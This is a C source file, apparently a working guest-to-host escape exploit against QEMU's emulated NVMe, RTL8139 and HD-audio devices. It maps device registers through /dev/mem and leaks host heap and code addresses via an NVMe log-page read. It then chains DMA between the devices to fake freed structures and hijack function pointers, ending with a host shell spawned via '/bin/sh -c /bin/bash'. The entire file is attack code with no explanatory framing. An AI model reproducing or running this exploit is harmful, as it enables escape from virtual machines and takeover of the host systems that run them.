#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

void *perror_exit(const char *msg) { perror(msg); exit(1); }

void *dev_mmio_map(unsigned long pa, unsigned long size)
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1)
        perror_exit("open /dev/mem");

    void *ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, pa);
    if (ptr == MAP_FAILED)
        perror_exit("mmap /dev/mem");

    close(fd);
    return ptr;
}

unsigned long virt_to_phys(const void *addr)
{
#define PAGEMAP_LENGTH sizeof(unsigned long)
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        perror_exit("open /proc/self/pagemap");

    unsigned long offset = (unsigned long)addr / getpagesize() * PAGEMAP_LENGTH;
    lseek(fd, offset, SEEK_SET);

    unsigned long page_frame_number = 0;
    if (read(fd, &page_frame_number, PAGEMAP_LENGTH) != PAGEMAP_LENGTH)
        perror_exit("open /proc/self/pagemap: read page_frame_number");

    page_frame_number &= 0x7FFFFFFFFFFFFF;
    close(fd);
    return (page_frame_number << 12) | ((size_t)addr & 0xfff);
}

void *nvme_bar;
void *nvme_db;
void *sq;
void *sq2;
void *cq;
void *cq2;
void *tmpbuf;
void *tmpbuf2;
void *rtl8139_bar;
void *hda;
void *txbuf;
void *uaf_data;
void *bh;

#define NVME_SQES 6
#define NVME_CQES 4
#define NVME_REG_CAP 0
#define NVME_REG_CC 20
#define NVME_REG_ASQ 40
#define NVME_REG_ACQ 48
#define NVME_REG_AQA 36
#define NVME_REG_AQA 36

typedef struct NvmeSglDescriptor {
    uint64_t addr;
    uint32_t len;
    uint8_t  rsvd[3];
    uint8_t  type;
} NvmeSglDescriptor;

typedef union NvmeCmdDptr {
    struct {
        uint64_t    prp1;
        uint64_t    prp2;
    };

    NvmeSglDescriptor sgl;
} NvmeCmdDptr;

typedef struct NvmeCmd {
    uint8_t     opcode;
    uint8_t     flags;
    uint16_t    cid;
    uint32_t    nsid;
    uint64_t    res1;
    uint64_t    mptr;
    NvmeCmdDptr dptr;
    uint32_t    cdw10;
    uint32_t    cdw11;
    uint32_t    cdw12;
    uint32_t    cdw13;
    uint32_t    cdw14;
    uint32_t    cdw15;
} NvmeCmd;

void restart_nvme()
{
    *(unsigned int *)(nvme_bar + NVME_REG_CC) = 0; // reset
    *(unsigned int *)(nvme_bar + NVME_REG_CC) = (NVME_CQES << 20) | (NVME_SQES << 16) | 1; // start
}

void setup_nvme()
{
    unsigned long sq_pa = virt_to_phys(sq);
    unsigned long cq_pa = virt_to_phys(cq);

    *(unsigned int *)(nvme_bar + NVME_REG_AQA) = 0x1f001f;
    *(unsigned int *)(nvme_bar + NVME_REG_ASQ) = sq_pa & 0xffffffff;
    *(unsigned int *)(nvme_bar + NVME_REG_ASQ + 4) = sq_pa >> 32;
    *(unsigned int *)(nvme_bar + NVME_REG_ACQ) = cq_pa & 0xffffffff;
    *(unsigned int *)(nvme_bar + NVME_REG_ACQ + 4) = cq_pa >> 32;
    restart_nvme();
}

unsigned int sq_head = 0;
unsigned int sq2_head = 0;
static void run_nvme_cmd_q0(struct NvmeCmd *cmd)
{
    memcpy(sq + sq_head * sizeof(struct NvmeCmd), cmd, sizeof(struct NvmeCmd));
    sq_head = (sq_head + 1) % 32;
    *(unsigned int *)nvme_db = sq_head;
}

static void run_nvme_cmd_q2(struct NvmeCmd *cmd)
{
    memcpy(sq2 + sq2_head * sizeof(struct NvmeCmd), cmd, sizeof(struct NvmeCmd));
    sq2_head = (sq2_head + 1) % 32;
    *(unsigned int *)(nvme_db + (2 << 3)) = sq2_head;
}


#define NVME_ADM_CMD_GET_LOG_PAGE 2
#define NVME_LOG_FDP_EVENTS 35

#ifndef MAP_POPULATE /* avoid vscode complain */
#define MAP_POPULATE 0
#endif

typedef struct NvmeCreateSq {
    uint8_t     opcode;
    uint8_t     flags;
    uint16_t    cid;
    uint32_t    rsvd1[5];
    uint64_t    prp1;
    uint64_t    rsvd8;
    uint16_t    sqid;
    uint16_t    qsize;
    uint16_t    sq_flags;
    uint16_t    cqid;
    uint32_t    rsvd12[4];
} NvmeCreateSq;

typedef struct NvmeCreateCq {
    uint8_t     opcode;
    uint8_t     flags;
    uint16_t    cid;
    uint32_t    rsvd1[5];
    uint64_t    prp1;
    uint64_t    rsvd8;
    uint16_t    cqid;
    uint16_t    qsize;
    uint16_t    cq_flags;
    uint16_t    irq_vector;
    uint32_t    rsvd12[4];
} NvmeCreateCq;

typedef struct NvmeRwCmd {
    uint8_t     opcode;
    uint8_t     flags;
    uint16_t    cid;
    uint32_t    nsid;
    uint32_t    cdw2;
    uint32_t    cdw3;
    uint64_t    mptr;
    NvmeCmdDptr dptr;
    uint64_t    slba;
    uint16_t    nlb;
    uint16_t    control;
    uint8_t     dsmgmt;
    uint8_t     rsvd;
    uint16_t    dspec;
    uint32_t    reftag;
    uint16_t    apptag;
    uint16_t    appmask;
} NvmeRwCmd;

/**
 * febf9000-febf90ff : 8139cp
 * febf4000-febf7fff : ICH HD audio
 *    febf4000~febf5fff == febf6000~febf7fff
 */
#define TxStatus0 0x10
#define TxPoll 0xd9
#define ChipCmd 0x37
#define CpCmd 0xe0
#define TxAddr0 0x20
#define TxConfig 0x40
#define RxConfig 0x44
#define RxBuf 0x30
#define RxBufPtr 0x38

#define CPlusTxEnb 1
#define CmdTxEnb 4
#define CmdRxEnb 8
#define TxLoopBack ((1 << 18) | (1 << 17))
#define AcceptAllPhys 1

#define NVME_ADM_CMD_CREATE_SQ 1
#define NVME_ADM_CMD_CREATE_CQ 5
#define NVME_ADM_CMD_SET_FEATURES 9
#define NVME_ADM_CMD_GET_FEATURES 10
#define NVME_HOST_BEHAVIOR_SUPPORT 22
#define NVME_CMD_IO_MGMT_RECV 18
#define NVME_CMD_IO_MGMT_SEND 29
#define NVME_IOMR_MO_RUH_STATUS 1
#define NVME_IOMS_MO_RUH_UPDATE 1

void setup_rtl8139()
{
    *(unsigned int *)(rtl8139_bar + TxStatus0 + 4) = 0;
    *(unsigned short *)(rtl8139_bar + CpCmd) = CPlusTxEnb;
    *(unsigned char *)(rtl8139_bar + ChipCmd) = CmdTxEnb | CmdRxEnb;
    *(unsigned int *)(rtl8139_bar + TxConfig) = TxLoopBack;
    *(unsigned int *)(rtl8139_bar + RxConfig) = AcceptAllPhys | (3 << 11);
    *(unsigned short *)(rtl8139_bar + RxBufPtr) = 0x10000 - 0x18;
    
    *(unsigned int *)(rtl8139_bar + TxAddr0) = virt_to_phys(tmpbuf);
    *(unsigned int *)(rtl8139_bar + TxAddr0 + 4) = 0;
}

#define ICH6_REG_SD_CTL 0x00
#define ICH6_REG_SD_BDLPL 0x18
#define ICH6_REG_SD_BDLPU 0x1c
#define ICH6_REG_SD_LVI 0x0c
#define ICH6_REG_GCTL 0x08

#define ICH6_GCTL_RESET (1 << 0)

int main()
{
    struct NvmeCmd cmd;

    nvme_bar = dev_mmio_map(0xfebf0000, 0x1000);
    nvme_db = dev_mmio_map(0xfebf0000 + 0x1000, 0x3000);
    hda = dev_mmio_map(0xfebf4000, 0x2000);
    rtl8139_bar = dev_mmio_map(0xfebf9000, 0x100);

    sq = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    sq2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    cq = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    cq2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    tmpbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    tmpbuf2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    uaf_data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    bh = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while (1) {
        txbuf = mmap((void *)NULL, 0x5000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (txbuf == MAP_FAILED) {
            exit(1);
        }

        int p1 = virt_to_phys(txbuf);
        int p2 = virt_to_phys(txbuf + 0x1000);
        int p3 = virt_to_phys(txbuf + 0x2000);
        int p4 = virt_to_phys(txbuf + 0x3000);
        int p5 = virt_to_phys(txbuf + 0x4000);

        if (p1 + 0x1000 == p2 && p2 + 0x1000 == p3 && p3 + 0x1000 == p4 && p4 + 0x1000 == p5)
            break;
    }

    setup_rtl8139();
    setup_nvme();

    // ========================================================================
    unsigned int read_len = 0x300;
    unsigned int read_off = 0x100;
    unsigned int endgrpid = 1;
    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = NVME_ADM_CMD_GET_LOG_PAGE;
    cmd.cdw10 = (read_len << 16) | NVME_LOG_FDP_EVENTS;
    cmd.cdw11 = (endgrpid << 16);
    cmd.cdw12 = read_off;
    cmd.dptr.prp1 = virt_to_phys(tmpbuf);
    run_nvme_cmd_q0(&cmd);

    setvbuf(stdout, NULL, _IONBF, 0);
    unsigned long heap = *(unsigned long *)(tmpbuf + 0x10) - 0xa23a30;
    unsigned long text = *(unsigned long *)(tmpbuf + 0x28) - 0x9ad830;
    printf("=============================\n");
    printf("[*] heap: 0x%lx\n", heap);
    printf("[*] text: 0x%lx\n", text);

    // ========================================================================

    NvmeCreateCq *cmd_cq = (NvmeCreateCq *)&cmd;
    memset(&cmd, 0, sizeof(cmd));
    cmd_cq->opcode = NVME_ADM_CMD_CREATE_CQ;
    cmd_cq->cqid = 2;
    cmd_cq->cq_flags = (1 << 1) | 1;
    cmd_cq->qsize = 0x7ff;
    cmd_cq->prp1 = virt_to_phys(cq2);
    run_nvme_cmd_q0(&cmd);

    NvmeCreateSq *cmd_sq = (NvmeCreateSq *)&cmd;
    memset(&cmd, 0, sizeof(cmd));
    cmd_sq->opcode = NVME_ADM_CMD_CREATE_SQ;
    cmd_sq->cqid = 2;
    cmd_sq->sqid = 2;
    cmd_sq->sq_flags = 1;
    cmd_sq->qsize = 0x7ff;
    cmd_sq->prp1 = virt_to_phys(sq2);
    run_nvme_cmd_q0(&cmd);

    #define CP_TX_OWN (1<<31)
    #define CP_TX_LS  (1<<28)

    #define TX_CNT 8
    int tx_size = 0x4074 + 0x20 * TX_CNT;
    *(unsigned int *)tmpbuf = CP_TX_OWN | CP_TX_LS | tx_size;
    *(unsigned int *)(tmpbuf + 8) = virt_to_phys(txbuf);
    *(unsigned int *)(tmpbuf + 12) = 0;
    // 4 bytes for packet header
    *(unsigned int *)(rtl8139_bar + RxBuf) = 0xfebf0000 + NVME_REG_CC - 4;
    
    int cqid = ((heap + 0x9076f0) >> 16) & 0xffff;
    memset(uaf_data, 'A', 0x100);
    *(unsigned long *)(uaf_data + 0xa) = cqid;
    *(unsigned long *)(uaf_data + 0x60) = 0xdeadbeef; // tql_next
    *(unsigned long *)(uaf_data + 0x68) = heap + 0x870; // tql_prev
    *(unsigned long *)(uaf_data + 0x38) = heap + 0x40340; // bh

    unsigned long target_addr = heap + 0xa8; // 0x50
    // function table pointer
    *(unsigned long *)(bh + 0x0) = target_addr - 0xb8; // ctx
    *(unsigned long *)(bh + 0x28) = 0;                 // flags

    int idx;
    for (idx = 0; idx < TX_CNT - 2; idx++) {
        *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPL) = 0;
        *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPU) = 0;
        *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_LVI) = 7; // (1 + N) * 0x10
    }

    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPL) = virt_to_phys(bh);
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPU) = 0;
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_LVI) = 7; // (1 + N) * 0x10
    idx++;

    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPL) = virt_to_phys(uaf_data);
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPU) = 0;
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_LVI) = 7; // (1 + N) * 0x10
    
    *(unsigned int *)(txbuf + 0x3fec + ICH6_REG_GCTL) = ICH6_GCTL_RESET;
    for (int i = 0; i < TX_CNT; i++)
        *(unsigned int *)(txbuf + 0x3fec + 0x80 + 0x20 * i + ICH6_REG_SD_CTL) = 2; // run
    
    memset(&cmd, 0, sizeof(cmd));
    cmd_cq->opcode = NVME_ADM_CMD_CREATE_CQ;
    cmd_cq->cqid = 1;
    cmd_cq->cq_flags = (1 << 1) | 1;
    cmd_cq->qsize = 0x7ff;
    cmd_cq->prp1 = virt_to_phys(cq2);
    run_nvme_cmd_q0(&cmd);

    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = NVME_CMD_IO_MGMT_RECV;
    cmd.nsid = 1;
    cmd.cdw10 = NVME_IOMR_MO_RUH_STATUS;
    cmd.cdw11 = 1;
    cmd.dptr.prp1 = 0xfebf9000 + TxPoll;
    run_nvme_cmd_q2(&cmd);

    // ========================================================================
    unsigned long sq_pa = virt_to_phys(sq);
    unsigned long cq_pa = virt_to_phys(cq);
    *(unsigned int *)(nvme_bar + NVME_REG_AQA) = 0x1f001f;
    *(unsigned int *)(nvme_bar + NVME_REG_ASQ) = sq_pa & 0xffffffff;
    *(unsigned int *)(nvme_bar + NVME_REG_ASQ + 4) = sq_pa >> 32;
    *(unsigned int *)(nvme_bar + NVME_REG_ACQ) = cq_pa & 0xffffffff;
    *(unsigned int *)(nvme_bar + NVME_REG_ACQ + 4) = cq_pa >> 32;
    *(unsigned int *)(nvme_bar + NVME_REG_CC) = (NVME_CQES << 20) | (NVME_SQES << 16) | 1;
    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 2) + ICH6_REG_SD_BDLPL) = virt_to_phys(bh);
    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 2) + ICH6_REG_SD_CTL) = 0;
    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 2) + ICH6_REG_SD_LVI) = 7;
    
    sq_head = 0;

    memset(tmpbuf, 'A', 512);
    *(unsigned int *)tmpbuf = 0x2;

    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = NVME_ADM_CMD_SET_FEATURES;
    cmd.cdw10 = NVME_HOST_BEHAVIOR_SUPPORT;
    cmd.dptr.prp1 = virt_to_phys(tmpbuf);
    run_nvme_cmd_q0(&cmd);

    unsigned long net_rtl8139_info = text + 0x1a87220;
    unsigned long rtl8139_can_receive = text + 0x50fddc;

    memset(bh, 0, 0x1000);
    *(unsigned long *)(bh + 0x0) = ((heap + 0x40340) >> 12) ^ (net_rtl8139_info + 0x10);
    *(unsigned long *)(bh + 0x8) = 0xdeadbeef;

    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = NVME_ADM_CMD_GET_FEATURES;
    cmd.cdw10 = NVME_HOST_BEHAVIOR_SUPPORT;
    cmd.dptr.prp1 = 0xfebf4000 + 0x80 + 0x20 * (TX_CNT - 2) + ICH6_REG_SD_CTL;
    run_nvme_cmd_q0(&cmd);

    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 3) + ICH6_REG_SD_LVI) = 3;
    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 3) + ICH6_REG_SD_CTL) = 0;
    cmd.dptr.prp1 = 0xfebf4000 + 0x80 + 0x20 * (TX_CNT - 3) + ICH6_REG_SD_CTL;
    run_nvme_cmd_q0(&cmd);


    unsigned long magic_function = text + 0x726afd; // net_bridge_run_helper+888
    *(unsigned long *)(bh + 0x00) = magic_function;
    *(unsigned long *)(bh + 0x08) = 0;
    *(unsigned long *)(bh + 0x10) = 0;
    *(unsigned long *)(bh + 0x18) = rtl8139_can_receive;

    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 4) + ICH6_REG_SD_BDLPL) = virt_to_phys(bh);
    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 4) + ICH6_REG_SD_LVI) = 3;
    *(unsigned int *)(hda + 0x80 + 0x20 * (TX_CNT - 4) + ICH6_REG_SD_CTL) = 0;
    cmd.dptr.prp1 = 0xfebf4000 + 0x80 + 0x20 * (TX_CNT - 4) + ICH6_REG_SD_CTL;
    run_nvme_cmd_q0(&cmd);

    // ========================================================================
    setup_rtl8139();
    
    tx_size = 0x1000;
    *(unsigned int *)tmpbuf = CP_TX_OWN | CP_TX_LS | tx_size;
    *(unsigned int *)(tmpbuf + 8) = virt_to_phys(txbuf);
    *(unsigned int *)(tmpbuf + 12) = 0;

    memset(txbuf, 'C', 0x1000);
    // /bin/sh sh -c /bin/bash
    unsigned long str_binsh = text + 0xdc2137;
    unsigned long str_sh = text + 0xdc2131;
    unsigned long str_dash_c = text + 0xdc2134;

    *(unsigned long *)(txbuf + 0x00) = str_sh;
    *(unsigned long *)(txbuf + 0x08) = str_dash_c;
    *(unsigned long *)(txbuf + 0x10) = (heap + 0x1282a60) + 0x80;
    *(unsigned long *)(txbuf + 0x18) = 0;

    *(unsigned long *)(txbuf + 0x80) = 0x7361622f6e69622f;
    *(unsigned long *)(txbuf + 0x88) = 0x68;
    
    memset(tmpbuf2, 'B', 512);
    *(unsigned int *)(tmpbuf2 + 0x00) = 1 << 6;
    cmd.opcode = NVME_ADM_CMD_SET_FEATURES;
    cmd.cdw10 = NVME_HOST_BEHAVIOR_SUPPORT;
    cmd.dptr.prp1 = virt_to_phys(tmpbuf2);
    run_nvme_cmd_q0(&cmd);

    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = NVME_ADM_CMD_GET_FEATURES;
    cmd.cdw10 = NVME_HOST_BEHAVIOR_SUPPORT;
    cmd.dptr.prp1 = 0xfebf9000 + TxPoll;
    run_nvme_cmd_q0(&cmd);

    return 0;
}